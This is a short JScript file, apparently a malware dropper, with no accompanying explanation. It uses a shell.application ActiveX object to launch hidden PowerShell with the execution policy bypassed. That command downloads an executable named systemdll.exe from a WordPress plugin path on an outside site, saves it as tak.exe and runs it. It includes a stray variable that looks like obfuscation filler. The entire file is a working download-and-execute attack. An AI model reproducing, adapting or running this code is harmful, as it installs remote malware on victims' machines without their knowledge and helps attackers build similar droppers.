var kaktotak = new ActiveXObject("shell.application");  
kaktotak.ShellExecute("PowerShell.exe ", "-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://tec16.com/wp-content/plugins/libravatar-replace/systemdll.exe','tak.exe');Start-Process 'tak.exe'", "", "open", 0);
var GqIEE = 158;